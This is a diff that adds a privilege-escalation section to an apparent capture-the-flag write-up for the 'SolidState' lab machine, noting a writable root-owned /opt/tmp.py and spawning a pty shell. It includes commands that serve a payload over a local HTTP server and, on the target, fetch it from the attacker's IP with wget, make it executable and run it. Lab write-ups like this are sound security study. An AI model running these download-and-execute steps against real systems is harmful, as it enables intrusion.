@@ -258,3 +258,25 @@ Connection closed by foreign host.
 python -c 'import pty;pty.spawn("bash")'
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236799653-fee561fc-2ee1-438c-9a1e-b8cf46ba419c.png)
+
+### Root
+  - Found a writeable file `tmp.py` in `/opt` owned by `root`.
+![image](https://user-images.githubusercontent.com/83878909/236800535-7b28a935-11b4-4b61-9708-0fd9c443add8.png)
+  - File contents.
+![image](https://user-images.githubusercontent.com/83878909/236802205-a7d0e316-a11f-4270-a61e-28ddaa1e635d.png)
+
+  - Check the file if its being run or not using `pspy`.
+  - Start a local python server.
+  - Upload `psypy` to the target, make it executable and run.
+
+```CSS
+▶ python -m http.server
+```
+```CSS
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cd /dev/shm
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget http://10.10.14.24/pspy32
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x pspy32
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./pspy32
+```
+![image](https://user-images.githubusercontent.com/83878909/236803621-a34c0e8a-8e3d-4802-9a59-498d65a9c5a0.png)
+
